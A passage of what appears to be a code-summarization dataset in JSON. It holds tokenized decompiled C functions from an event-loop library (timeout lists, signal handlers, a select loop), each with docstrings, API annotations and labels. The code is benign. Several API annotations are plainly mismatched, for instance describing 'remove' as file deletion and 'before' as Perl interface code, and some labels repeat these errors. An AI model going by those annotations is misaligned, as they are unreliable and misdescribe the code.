            "user",
            "data",
            ",",
            "updating",
            "the",
            "remaining",
            "time",
            "if",
            "the",
            "event",
            "has",
            "n't",
            "occurred",
            "yet",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ",",
            "__int64",
            "a3",
            ",",
            "_QWORD",
            "*",
            "a4",
            ")",
            "{",
            "unsigned",
            "int",
            "v7",
            ";",
            "__int64",
            "*",
            "v8",
            ";",
            "__int64",
            "*",
            "v9",
            ";",
            "_QWORD",
            "v10",
            "[",
            "4",
            "]",
            ";",
            "v10",
            "[",
            "3",
            "]",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v7",
            "=",
            "0",
            ";",
            "os_get_reltime",
            "(",
            "v10",
            ")",
            ";",
            "a4",
            "[",
            "1",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "a4",
            "=",
            "a4",
            "[",
            "1",
            "]",
            ";",
            "v8",
            "=",
            "(",
            "__int64",
            "*",
            ")",
            "qword_1950",
            ";",
            "v9",
            "=",
            "*",
            "(",
            "__int64",
            "*",
            "*",
            ")",
            "qword_1950",
            ";",
            "while",
            "(",
            "v8",
            "!",
            "=",
            "&",
            "qword_1950",
            ")",
            "{",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "v8",
            "[",
            "6",
            "]",
            "&",
            "&",
            "a2",
            "=",
            "=",
            "v8",
            "[",
            "4",
            "]",
            "&",
            "&",
            "a3",
            "=",
            "=",
            "v8",
            "[",
            "5",
            "]",
            ")",
            "{",
            "v7",
            "=",
            "1",
            ";",
            "if",
            "(",
            "os_reltime_before",
            "(",
            "v10",
            ",",
            "v8",
            "+",
            "2",
            ")",
            ")",
            "os_reltime_sub",
            "(",
            "v8",
            "+",
            "2",
            ",",
            "v10",
            ",",
            "a4",
            ")",
            ";",
            "eloop_remove_timeout",
            "(",
            "v8",
            ")",
            ";",
            "return",
            "v7",
            ";",
            "}",
            "v8",
            "=",
            "v9",
            ";",
            "v9",
            "=",
            "(",
            "__int64",
            "*",
            ")",
            "*",
            "v9",
            ";",
            "}",
            "return",
            "v7",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function os_get_reltime is used to get the relative time in seconds and microseconds from the system clock or monotonic clock, returning 0 on success and -1 on failure.",
            "The function \"remove\" is used to delete a file or directory in the operating system's file system."
        ],
        "longer_label": "The given code defines a function `eloop_cancel_timeout_one` which searches for a specific timeout in a linked list, removes it if found, calculates the time difference using system time, and returns 1 if successful, utilizing functions like `os_get_reltime` and `eloop_remove_timeout`."
    },
    {
        "id": 67,
        "docstring_tokens": [
            "This",
            "code",
            "checks",
            "if",
            "a",
            "timeout",
            "handler",
            "with",
            "specified",
            "data",
            "and",
            "user",
            "data",
            "is",
            "registered",
            "in",
            "the",
            "eloop",
            "timeout",
            "list",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ",",
            "__int64",
            "a3",
            ")",
            "{",
            "__int64",
            "*",
            "i",
            ";",
            "for",
            "(",
            "i",
            "=",
            "(",
            "__int64",
            "*",
            ")",
            "qword_1950",
            ";",
            "i",
            "!",
            "=",
            "&",
            "qword_1950",
            ";",
            "i",
            "=",
            "(",
            "__int64",
            "*",
            ")",
            "*",
            "i",
            ")",
            "{",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "i",
            "[",
            "6",
            "]",
            "&",
            "&",
            "a2",
            "=",
            "=",
            "i",
            "[",
            "4",
            "]",
            "&",
            "&",
            "a3",
            "=",
            "=",
            "i",
            "[",
            "5",
            "]",
            ")",
            "return",
            "1L",
            "L",
            ";",
            "}",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The _is_timeout function is used to determine if a timeout condition has been met in the context of draining a console into a buffer, or for handling a double click time in a user interface.",
            "The \"registered\" function is part of a system managing I/O devices, likely related to Advanced Configuration and Power Interface (ACPI), checking if a specific I/O device is registered and possibly handling events and callbacks associated with device registration."
        ],
        "longer_label": "The provided code defines a function, `eloop_is_timeout_registered`, which iterates through a linked list of registered timeout events associated with I/O devices, likely related to ACPI, to check if a specific timeout event with parameters `a1`, `a2`, and `a3` is registered, returning 1 if found, and 0 otherwise, with annotations suggesting its use in managing I/O devices and handling timeout conditions."
    },
    {
        "id": 68,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "to",
            "add",
            "a",
            "new",
            "job",
            "with",
            "a",
            "specified",
            "task",
            "function",
            "and",
            "interval",
            "to",
            "a",
            "linked",
            "list",
            "of",
            "tasks",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "(",
            "job_t",
            "task_fn",
            ",",
            "size_t",
            "interval",
            ")",
            "{",
            "task_node",
            "*",
            "v2",
            ";",
            "task_node",
            "*",
            "v3",
            ";",
            "v2",
            "=",
            "(",
            "task_node",
            "*",
            ")",
            "malloc",
            "(",
            "0x20uL",
            "L",
            ")",
            ";",
            "v3",
            "=",
            "head",
            ";",
            "v2",
            "-",
            ">",
            "task_fn",
            "=",
            "task_fn",
            ";",
            "v2",
            "-",
            ">",
            "interval",
            "=",
            "interval",
            ";",
            "v2",
            "-",
            ">",
            "next",
            "=",
            "v3",
            ";",
            "v2",
            "-",
            ">",
            "time_remaining",
            "=",
            "interval",
            ";",
            "head",
            "=",
            "v2",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"malloc\" function is used to allocate memory dynamically in C programming, allowing for the allocation of memory as needed during program execution."
        ],
        "longer_label": "The code uses the \"malloc\" function to dynamically allocate memory for a new task node and adds it to the head of the task list, with the specified task function and interval."
    },
    {
        "id": 69,
        "docstring_tokens": [
            "The",
            "function",
            "'eloop_deplete_timeout",
            "'",
            "checks",
            "if",
            "a",
            "timeout",
            "with",
            "the",
            "same",
            "handler",
            ",",
            "eloop",
            "data",
            ",",
            "and",
            "user",
            "data",
            "already",
            "exists",
            ",",
            "and",
            "if",
            "so",
            ",",
            "updates",
            "the",
            "timeout",
            "with",
            "the",
            "requested",
            "seconds",
            "and",
            "microseconds",
            ",",
            "canceling",
            "the",
            "old",
            "timeout",
            "and",
            "registering",
            "the",
            "new",
            "one",
            ",",
            "otherwise",
            "it",
            "returns",
            "-1",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "unsigned",
            "int",
            "a1",
            ",",
            "unsigned",
            "int",
            "a2",
            ",",
            "__int64",
            "a3",
            ",",
            "__int64",
            "a4",
            ",",
            "__int64",
            "a5",
            ")",
            "{",
            "__int64",
            "*",
            "i",
            ";",
            "_QWORD",
            "v10",
            "[",
            "2",
            "]",
            ";",
            "__int64",
            "v11",
            ";",
            "__int64",
            "v12",
            ";",
            "_QWORD",
            "v13",
            "[",
            "4",
            "]",
            ";",
            "v13",
            "[",
            "3",
            "]",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "(",
            "__int64",
            "*",
            ")",
            "qword_1950",
            ";",
            ";",
            "i",
            "=",
            "(",
            "__int64",
            "*",
            ")",
            "*",
            "i",
            ")",
            "{",
            "if",
            "(",
            "i",
            "=",
            "=",
            "&",
            "qword_1950",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "if",
            "(",
            "a3",
            "=",
            "=",
            "i",
            "[",
            "6",
            "]",
            "&",
            "&",
            "a4",
            "=",
            "=",
            "i",
            "[",
            "4",
            "]",
            "&",
            "&",
            "a5",
            "=",
            "=",
            "i",
            "[",
            "5",
            "]",
            ")",
            "break",
            ";",
            "}",
            "v11",
            "=",
            "a1",
            ";",
            "v12",
            "=",
            "a2",
            ";",
            "os_get_reltime",
            "(",
            "v10",
            ")",
            ";",
            "os_reltime_sub",
            "(",
            "i",
            "+",
            "2",
            ",",
            "v10",
            ",",
            "v13",
            ")",
            ";",
            "if",
            "(",
            "!",
            "os_reltime_before",
            "(",
            "&",
            "v11",
            ",",
            "v13",
            ")",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "eloop_cancel_timeout",
            "(",
            "a3",
            ",",
            "a4",
            ",",
            "a5",
            ")",
            ";",
            "eloop_register_timeout",
            "(",
            "v11",
            ",",
            "v12",
            ",",
            "a3",
            ",",
            "a4",
            ",",
            "a5",
            ")",
            ";",
            "return",
            "1L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsq` is used to read a quadword (64 bits) from the FS segment register, commonly utilized in low-level programming for accessing thread-local storage or operating system data structures in protected mode x86 architecture.",
            "The function os_get_reltime is used to retrieve the current relative time in seconds and microseconds from the system clock.",
            "The function `os_reltime` likely represents a structure for storing relative time, possibly used for tracking time differences or intervals in systems programming, as indicated by its inclusion in code snippets related to sleep functions and tracking station lists in a networking context.",
            "The \"before\" function appears to be a part of a larger codebase, likely related to Perl or a similar language, and it seems to be involved in moving an editable component either before or after another component within a track window, possibly for user interface interactions or data manipulation purposes."
        ],
        "longer_label": "The provided code is a function `eloop_deplete_timeout` that iterates through a list, compares given parameters with elements in the list, calculates time differences using system clock functions, and performs timeout registration and cancellation operations based on the comparison results, leveraging low-level functions for thread-local storage and time manipulation."
    },
    {
        "id": 70,
        "docstring_tokens": [
            "The",
            "function",
            "eloop_replenish_timeout",
            "checks",
            "if",
            "a",
            "timeout",
            "with",
            "the",
            "same",
            "handler",
            ",",
            "eloop_data",
            ",",
            "and",
            "user_data",
            "exists",
            ",",
            "and",
            "if",
            "so",
            ",",
            "cancels",
            "it",
            "and",
            "registers",
            "a",
            "new",
            "timeout",
            "with",
            "the",
            "requested",
            "seconds",
            "and",
            "microseconds",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "unsigned",
            "int",
            "a1",
            ",",
            "unsigned",
            "int",
            "a2",
            ",",
            "__int64",
            "a3",
            ",",
            "__int64",
            "a4",
            ",",
            "__int64",
            "a5",
            ")",
            "{",
            "__int64",
            "*",
            "i",
            ";",
            "_QWORD",
            "v10",
            "[",
            "2",
            "]",
            ";",
            "__int64",
            "v11",
            ";",
            "__int64",
            "v12",
            ";",
            "_QWORD",
            "v13",
            "[",
            "4",
            "]",
            ";",
            "v13",
            "[",
            "3",
            "]",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "(",
            "__int64",
            "*",
            ")",
            "qword_1950",
            ";",
            ";",
            "i",
            "=",
            "(",
            "__int64",
            "*",
            ")",
            "*",
            "i",
            ")",
            "{",
            "if",
            "(",
            "i",
            "=",
            "=",
            "&",
            "qword_1950",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "if",
            "(",
            "a3",
            "=",
            "=",
            "i",
            "[",
            "6",
            "]",
            "&",
            "&",
            "a4",
            "=",
            "=",
            "i",
            "[",
            "4",
            "]",
            "&",
            "&",
            "a5",
            "=",
            "=",
            "i",
            "[",
            "5",
            "]",
            ")",
            "break",
            ";",
            "}",
            "v11",
            "=",
            "a1",
            ";",
            "v12",
            "=",
            "a2",
            ";",
            "os_get_reltime",
            "(",
            "v10",
            ")",
            ";",
            "os_reltime_sub",
            "(",
            "i",
            "+",
            "2",
            ",",
            "v10",
            ",",
            "v13",
            ")",
            ";",
            "if",
            "(",
            "!",
            "os_reltime_before",
            "(",
            "v13",
            ",",
            "&",
            "v11",
            ")",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "eloop_cancel_timeout",
            "(",
            "a3",
            ",",
            "a4",
            ",",
            "a5",
            ")",
            ";",
            "eloop_register_timeout",
            "(",
            "v11",
            ",",
            "v12",
            ",",
            "a3",
            ",",
            "a4",
            ",",
            "a5",
            ")",
            ";",
            "return",
            "1L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function __readfsqword is used to read an unsigned 64-bit integer from a specific offset within the FS segment register, typically employed in low-level system programming for accessing thread-local storage (TLS) data on x86 architecture.",
            "The function `os_get_reltime` is designed to retrieve the current relative time (in seconds and microseconds) from the system, utilizing the monotonic clock if available, ensuring accuracy and stability in time measurements, particularly in scenarios where absolute time is less relevant.",
            "The function `os_reltime` likely represents a data structure for storing relative time information, such as seconds and microseconds, and is possibly utilized within networking or systems programming contexts for tracking time differentials or durations."
        ],
        "longer_label": "The provided code is a function `eloop_replenish_timeout` designed to replenish a timeout if a specified condition is met, utilizing low-level system functions for accessing thread-local storage, retrieving relative time, and manipulating timeouts in a system or networking programming context."
    },
    {
        "id": 71,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "to",
            "handle",
            "a",
            "signal",
            "that",
            "prints",
            "an",
            "error",
            "message",
            "and",
            "exits",
            "the",
            "program",
            "with",
            "an",
            "error",
            "status",
            "if",
            "it",
            "can",
            "not",
            "process",
            "SIGINT",
            "or",
            "SIGTERM",
            "signals",
            "within",
            "two",
            "seconds",
            "."
        ],
        "code_tokens": [
            "void",
            "__noreturn",
            "FUN0",
            "(",
            ")",
            "{",
            "wpa_printf",
            "(",
            "5L",
            "L",
            ",",
            "\"eloop: could not process SIGINT or SIGTERM in two seconds. Looks like there\\n\"",
            "\"is a bug that ends up in a busy loop that prevents clean shutdown.\\n\"",
            "\"Killing program forcefully.\\n\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `wpa_printf` is used for conditional printing of debugging and error messages, potentially directing output to stdout, stderr, and/or syslog, with the printing controlled by the specified priority level (`MSG_*`)."
        ],
        "longer_label": "The function `eloop_handle_alarm` handles the scenario where SIGINT or SIGTERM signals are not processed within two seconds, likely due to a bug causing a busy loop, by printing an error message and forcibly exiting the program with a status code of 1."
    },
    {
        "id": 72,
        "docstring_tokens": [
            "The",
            "function",
            "eloop_handle_signal",
            "sets",
            "a",
            "pending",
            "termination",
            "flag",
            "if",
            "the",
            "signal",
            "is",
            "SIGINT",
            "or",
            "SIGTERM",
            "and",
            "increments",
            "the",
            "eloop",
            "signaled",
            "count",
            ",",
            "also",
            "incrementing",
            "the",
            "signaled",
            "count",
            "for",
            "a",
            "specific",
            "signal",
            "if",
            "it",
            "matches",
            "one",
            "in",
            "the",
            "eloop",
            "signals",
            "array",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "a1",
            ")",
            "{",
            "int",
            "i",
            ";",
            "if",
            "(",
            "(",
            "a1",
            "=",
            "=",
            "2",
            "|",
            "|",
            "a1",
            "=",
            "=",
            "15",
            ")",
            "&",
            "&",
            "!",
            "dword_1974",
            ")",
            "{",
            "dword_1974",
            "=",
            "1",
            ";",
            "signal",
            "(",
            "14",
            ",",
            "(",
            "__sighandler_t",
            ")",
            "eloop_handle_alarm",
            ")",
            ";",
            "alarm",
            "(",
            "2u",
            ")",
            ";",
            "}",
            "+",
            "+",
            "dword_1970",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "dword_1960",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "32L",
            "L",
            "*",
            "i",
            "+",
            "qword_1968",
            ")",
            ")",
            "{",
            "+",
            "+",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "32L",
            "L",
            "*",
            "i",
            "+",
            "qword_1968",
            "+",
            "24",
            ")",
            ";",
            "return",
            ";",
            "}",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The code is a signal handler function in C/C++ that increments a counter and processes signals 2 and 15, setting up an alarm handler if necessary, and then iterates over an array of signal values, incrementing corresponding counters."
    },
    {
        "id": 73,
        "docstring_tokens": [
            "The",
            "function",
            "eloop_process_pending_signals",
            "resets",
            "signaled",
            "flags",
            ",",
            "handles",
            "pending",
            "terminate",
            "signals",
            ",",
            "and",
            "calls",
            "signal",
            "handlers",
            "for",
            "signaled",
            "signals",
            "in",
            "a",
            "loop",
            "."
        ],
        "code_tokens": [
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "__int64",
            "result",
            ";",
            "int",
            "i",
            ";",
            "result",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "dword_1970",
            ";",
            "if",
            "(",
            "dword_1970",
            ")",
            "{",
            "dword_1970",
            "=",
            "0",
            ";",
            "if",
            "(",
            "dword_1974",
            ")",
            "{",
            "alarm",
            "(",
            "0",
            ")",
            ";",
            "dword_1974",
            "=",
            "0",
            ";",
            "}",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "result",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "dword_1960",
            ";",
            "if",
            "(",
            "i",
            ">",
            "=",
            "dword_1960",
            ")",
            "break",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "32L",
            "L",
            "*",
            "i",
            "+",
            "qword_1968",
            "+",
            "24",
            ")",
            ")",
            "{",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "32L",
            "L",
            "*",
            "i",
            "+",
            "qword_1968",
            "+",
            "24",
            ")",
            "=",
            "0",
            ";",
            "(",
            "*",
            "(",
            "void",
            "(",
            "__fastcall",
            "*",
            "*",
            ")",
            "(",
            "_QWORD",
            ",",
            "_QWORD",
            ")",
            ")",
            "(",
            "32L",
            "L",
            "*",
            "i",
            "+",
            "qword_1968",
            "+",
            "16",
            ")",
            ")",
            "(",
            "*",
            "(",
            "unsigned",
            "int",
            "*",
            ")",
            "(",
            "32L",
            "L",
            "*",
            "i",
            "+",
            "qword_1968",
            ")",
            ",",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "32L",
            "L",
            "*",
            "i",
            "+",
            "qword_1968",
            "+",
            "8",
            ")",
            ")",
            ";",
            "}",
            "}",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The given code appears to be a function named `eloop_process_pending_signals` which processes pending signals, potentially related to handling alarms and executing functions based on stored pointers, but lacks context or annotations for further analysis."
    },
    {
        "id": 74,
        "docstring_tokens": [
            "This",
            "code",
            "registers",
            "a",
            "signal",
            "handler",
            "with",
            "the",
            "specified",
            "signal",
            ",",
            "handler",
            "function",
            ",",
            "and",
            "user",
            "data",
            "for",
            "the",
            "event",
            "loop",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "a1",
            ",",
            "__int64",
            "a2",
            ",",
            "__int64",
            "a3",
            ")",
            "{",
            "__int64",
            "v5",
            ";",
            "v5",
            "=",
            "os_realloc_array",
            "(",
            "qword_1968",
            ",",
            "dword_1960",
            "+",
            "1",
            ",",
            "0x20uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v5",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v5",
            "+",
            "32L",
            "L",
            "*",
            "dword_1960",
            ")",
            "=",
            "a1",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v5",
            "+",
            "32L",
            "L",
            "*",
            "dword_1960",
            "+",
            "8",
            ")",
            "=",
            "a3",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v5",
            "+",
            "32L",
            "L",
            "*",
            "dword_1960",
            "+",
            "16",
            ")",
            "=",
            "a2",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "32L",
            "L",
            "*",
            "dword_1960",
            "+",
            "+",
            "+",
            "v5",
            "+",
            "24",
            ")",
            "=",
            "0",
            ";",
            "qword_1968",
            "=",
            "v5",
            ";",
            "signal",
            "(",
            "a1",
            ",",
            "eloop_handle_signal",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `os_realloc` appears to be part of a system memory management library, likely intended to reallocate memory previously allocated by `os_malloc`, enabling dynamic resizing of memory blocks while maintaining data integrity.",
            "The \"array\" function appears to initialize arrays and structures, assigning values and creating contexts for interception devices, likely for handling input/output operations or device management within a larger system."
        ],
        "longer_label": "The `eloop_register_signal` function reallocates memory for an array, assigns values to its elements, and registers a signal handler, likely for managing input/output operations or device signals within a larger system."
    },
    {
        "id": 75,
        "docstring_tokens": [
            "This",
            "code",
            "registers",
            "a",
            "signal",
            "handler",
            "for",
            "SIGINT",
            "and",
            "SIGTERM",
            "signals",
            "and",
            "returns",
            "the",
            "result",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ")",
            "{",
            "unsigned",
            "int",
            "v3",
            ";",
            "v3",
            "=",
            "eloop_register_signal",
            "(",
            "2",
            ",",
            "a1",
            ",",
            "a2",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v3",
            ")",
            "return",
            "(",
            "unsigned",
            "int",
            ")",
            "eloop_register_signal",
            "(",
            "15",
            ",",
            "a1",
            ",",
            "a2",
            ")",
            ";",
            "return",
            "v3",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The __int64 function is used to define a 64-bit integer data type for use in Windows and non-Windows environments.",
            "The `_register` function seems to be a placeholder or template for various registration tasks in different programming contexts, possibly related to resource management, memory allocation, or Lua scripting, based on the provided code snippets.",
            "The function `signal_terminate` appears to be handling termination signals in a program, likely cleaning up resources and ensuring proper shutdown when receiving termination signals such as SIGTERM or SIGINT.",
            "The function `register_sign` appears to be part of a larger program for managing signs/icons in a graphical user interface (GUI) environment, specifically registering and displaying signs/icons using XPM images on the X Window System."
        ],
        "longer_label": "The code defines a 64-bit integer function for registering termination signals and handling cleanup and shutdown tasks in a program."
    },
    {
        "id": 76,
        "docstring_tokens": [
            "The",
            "function",
            "`",
            "eloop_run",
            "`",
            "runs",
            "an",
            "event",
            "loop",
            "until",
            "termination",
            ",",
            "processing",
            "pending",
            "signals",
            "and",
            "timeouts",
            ",",
            "and",
            "handling",
            "socket",
            "events",
            "using",
            "polling",
            "mechanisms",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "__int64",
            "v0",
            ";",
            "struct",
            "timeval",
            "*",
            "p_timeout",
            ";",
            "int",
            "*",
            "v2",
            ";",
            "char",
            "*",
            "v3",
            ";",
            "__int64",
            "v4",
            ";",
            "int",
            "v6",
            ";",
            "fd_set",
            "*",
            "readfds",
            ";",
            "fd_set",
            "*",
            "writefds",
            ";",
            "fd_set",
            "*",
            "exceptfds",
            ";",
            "__int64",
            "v10",
            ";",
            "_QWORD",
            "*",
            "v11",
            ";",
            "__int64",
            "v12",
            ";",
            "__int64",
            "v13",
            ";",
            "void",
            "(",
            "__fastcall",
            "*",
            "v14",
            ")",
            "(",
            "__int64",
            ",",
            "__int64",
            ")",
            ";",
            "struct",
            "timeval",
            "timeout",
            ";",
            "struct",
            "timeval",
            "v16",
            ";",
            "__int64",
            "v17",
            "[",
            "3",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v18",
            ";",
            "v18",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "readfds",
            "=",
            "(",
            "fd_set",
            "*",
            ")",
            "os_malloc",
            "(",
            "128L",
            "L",
            ")",
            ";",
            "writefds",
            "=",
            "(",
            "fd_set",
            "*",
            ")",
            "os_malloc",
            "(",
            "128L",
            "L",
            ")",
            ";",
            "exceptfds",
            "=",
            "(",
            "fd_set",
            "*",
            ")",
            "os_malloc",
            "(",
            "128L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "readfds",
            "&",
            "&",
            "writefds",
            "&",
            "&",
            "exceptfds",
            ")",
            "{",
            "while",
            "(",
            "!",
            "dword_1978",
            "&",
            "&",
            "(",
            "!",
            "dl_list_empty",
            "(",
            "&",
            "qword_1950",
            ")",
            "|",
            "|",
            "(",
            "int",
            ")",
            "dword_1908",
            "[",
            "0",
            "]",
            ">",
            "0",
            "|",
            "|",
            "(",
            "int",
            ")",
            "dword_1920",
            "[",
            "0",
            "]",
            ">",
            "0",
            "|",
            "|",
            "(",
            "int",
            ")",
            "dword_1938",
            "[",
            "0",
            "]",
            ">",
            "0",
            ")",
            ")",
            "{",
            "if",
            "(",
            "dword_1974",
            ")",
            "{",
            "eloop_process_pending_signals",
            "(",
            ")",
            ";",
            "if",
            "(",
            "dword_1978",
            ")",
            "break",
            ";",
            "}",
            "if",
            "(",
            "dl_list_empty",
            "(",
            "&",
            "qword_1950",
            ")",
            ")",
            "v0",
            "=",
            "0L",
            "L",
            ";",
            "else",
            "v0",
            "=",
            "qword_1950",
            ";",
            "v10",
            "=",
            "v0",
            ";",
            "if",
            "(",
            "v0",
            ")",
            "{",
            "os_get_reltime",
            "(",
            "v17",
            ")",
            ";",
            "if",
            "(",
            "os_reltime_before",
            "(",
            "v17",
            ",",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v10",
            "+",
            "16",
            ")",
            ")",
            ")",
            "{",
            "os_reltime_sub",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v10",
            "+",
            "16",
            ")",
            ",",
            "v17",
            ",",
            "&",
            "v16",
            ")",
            ";",
            "}",
            "else",
            "{",
            "v16",
            ".",
            "tv_usec",
            "=",
            "0L",
            "L",
            ";",
            "v16",
            ".",
            "tv_sec",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "timeout",
            "=",
            "v16",
            ";",
            "}",
            "eloop_sock_table_set_fds",
            "(",
            "dword_1908",
            ",",
            "readfds",
            ")",
            ";",
            "eloop_sock_table_set_fds",
            "(",
            "dword_1920",
            ",",
            "writefds",
            ")",
            ";",
            "eloop_sock_table_set_fds",
            "(",
            "dword_1938",
            ",",
            "exceptfds",
            ")",
            ";",
            "if",
            "(",
            "v10",
            ")",
            "p_timeout",
            "=",
            "&",
            "timeout",
            ";",
            "else",
            "p_timeout",
            "=",
            "0L",
            "L",
            ";",
            "v6",
            "=",
            "select",
            "(",
            "eloop",
            "+",
            "1",
            ",",
            "readfds",
            ",",
            "writefds",
            ",",
            "exceptfds",
            ",",
            "p_timeout",
            ")",
            ";",
            "if",
            "(",
            "v6",
            "<",
            "0",
            "&",
            "&",
            "*",
            "_errno_location",
            "(",
            ")",
            "!",
            "=",
            "4",
            "&",
            "&",
            "*",
            "_errno_location",
            "(",
            ")",
            ")",
            "{",
            "v2",
            "=",
            "_errno_location",
            "(",
            ")",
            ";",
            "v3",
            "=",
            "strerror",
            "(",
            "*",
            "v2",
            ")",
            ";",
            "wpa_printf",
            "(",
            "5L",
            "L",
            ",",
            "\"eloop: %s: %s\"",
            ",",
            "\"select\"",
            ",",
            "v3",
            ")",
            ";",
            "goto",
            "LABEL_39",
            ";",
            "}",
            "dword_191C",
            "=",
            "0",
            ";",
            "dword_1934",
            "=",
            "0",
            ";",
            "dword_194C",
            "=",
            "0",
            ";",
            "eloop_process_pending_signals",
            "(",
            ")",
            ";",
            "if",
            "(",
            "dl_list_empty",
            "(",
            "&",
            "qword_1950",
            ")",
            ")",
            "v4",
            "=",
            "0L",
            "L",
            ";",
            "else",
            "v4",
            "=",
            "qword_1950",
            ";",
            "v11",
            "=",
            "(",
            "_QWORD",
            "*",
            ")",
            "v4",
            ";",
            "if",
            "(",
            "v4",
            ")",
            "{",
            "os_get_reltime",
            "(",
            "v17",
            ")",
            ";",
            "if",
            "(",
            "!",
            "os_reltime_before",
            "(",
            "v17",
            ",",
            "v11",
            "+",
            "2",
            ")",
            ")",
            "{",
            "v12",
            "=",
            "v11",
            "[",
            "4",
            "]",
            ";",
            "v13",
            "=",
            "v11",
            "[",
            "5",
            "]",
            ";",
            "v14",
            "=",
            "(",
            "void",
            "(",
            "__fastcall",
            "*",
            ")",
            "(",
            "__int64",
            ",",
            "__int64",
            ")",
            ")",
            "v11",
            "[",
            "6",
            "]",
            ";",
            "eloop_remove_timeout",
            "(",
            "v11",
            ")",
            ";",
            "v14",
            "(",
            "v12",
            ",",
            "v13",
            ")",
            ";",
            "}",
            "}",
            "if",
            "(",
            "v6",
            ">",
            "0",
            "&",
            "&",
            "!",
            "dword_191C",
            "&",
            "&",
            "!",
            "dword_1934",
            "&",
            "&",
            "!",
            "dword_194C",
            ")",
            "{",
            "eloop_sock_table_dispatch",
            "(",
            "(",
            "__int64",
            ")",
            "dword_1908",
            ",",
            "(",
            "__int64",
            ")",
            "readfds",
            ")",
            ";",
            "eloop_sock_table_dispatch",
            "(",
            "(",
            "__int64",
            ")",
            "dword_1920",
            ",",
            "(",
            "__int64",
            ")",
            "writefds",
            ")",
            ";",
            "eloop_sock_table_dispatch",
            "(",
            "(",
            "__int64",
            ")",
            "dword_1938",
            ",",
            "(",
            "__int64",
            ")",
